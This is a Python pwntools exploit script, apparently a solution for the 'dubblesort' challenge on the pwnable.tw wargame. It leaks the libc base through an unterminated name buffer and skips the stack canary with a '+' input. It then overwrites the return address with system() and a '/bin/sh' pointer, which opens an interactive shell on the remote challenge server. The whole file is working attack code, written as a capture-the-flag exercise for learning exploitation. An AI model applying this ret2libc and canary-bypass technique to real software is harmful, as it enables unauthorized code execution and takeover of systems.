#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\x00"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda len=8, c=b'A': c * len

exe = ELF("dubblesort_patched", checksec=False)
libc = ELF("libc_32.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
b *main+111
# b *main+133
# b *main+240
# b *main+328
b *main+333
set follow-fork-mode parent
set detach-on-fork on
continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.1)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10101
        return remote(host, port)

p = conn()

if args.LOCAL:
    n = 24
else:
    n = 28
sla(p, b'name', pad(n))
ru(p, pad(n))
libc.address = leak_bytes(rn(p, 4), 0x1b000a)
lg("libc base", libc.address)

to_canary = 24
canary = 1
to_ret_addr = 8
to_binsh = 2
slan(p, b'to sort', to_canary + canary + to_ret_addr + to_binsh)

def send_num(count, num):
    for i in range(count):
        slan(p, b'number', num)

send_num(to_canary, 0)
send_num(canary, '+')
send_num(to_ret_addr, libc.symbols['system'])
send_num(to_binsh, binsh(libc))

rr(p, 1)
ia(p)